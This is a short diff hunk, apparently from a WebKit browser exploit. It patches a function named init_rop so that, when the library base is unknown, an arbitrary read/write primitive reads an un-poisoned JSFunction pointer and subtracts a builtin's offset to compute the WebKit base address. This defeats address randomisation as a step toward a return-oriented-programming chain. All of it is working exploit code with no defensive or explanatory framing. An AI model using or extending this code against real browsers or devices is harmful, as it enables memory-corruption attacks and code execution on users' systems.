@@ -1192,6 +1192,11 @@ function init_rop() {
     m_executableOrRareData = m_executableOrRareData.xor(g_JSFunctionPoison);
   }
 
+  if (webkit_base === undefined) {
+    const m_function = arw.view(m_executableOrRareData).getBInt(constants.wk_JSFunction_m_function, true);
+    webkit_base = m_function.sub(constants.wk_expm1_builtin);
+  }
+
   logger.debug(`m_executableOrRareData: ${m_executableOrRareData}`);
 
   logger.info(`webkit base: ${webkit_base}`);
